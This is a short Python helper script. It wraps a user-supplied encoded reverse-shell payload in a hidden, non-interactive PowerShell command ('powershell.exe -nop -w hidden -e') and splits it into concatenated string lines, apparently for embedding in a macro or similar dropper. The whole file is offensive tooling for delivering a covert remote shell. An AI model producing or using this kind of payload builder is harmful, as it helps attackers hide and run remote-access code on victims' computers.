#!/usr/bin/python3

import sys

try:

    encodedRevshell = sys.argv[1]
    
    print(" ")

    str = "powershell.exe -nop -w hidden -e "+encodedRevshell 

    try:

        n = sys.argv[2]

    except:

        n = 50

    for i in range(0, len(str), n):
	    print("Str = Str + " + '"' + str[i:i+n] + '"')

except:

    print("[!] Bad usage.")
    print("[!] Usage: ./script <encodedThing> <segmentLength>")
    print("    Default length 50.")
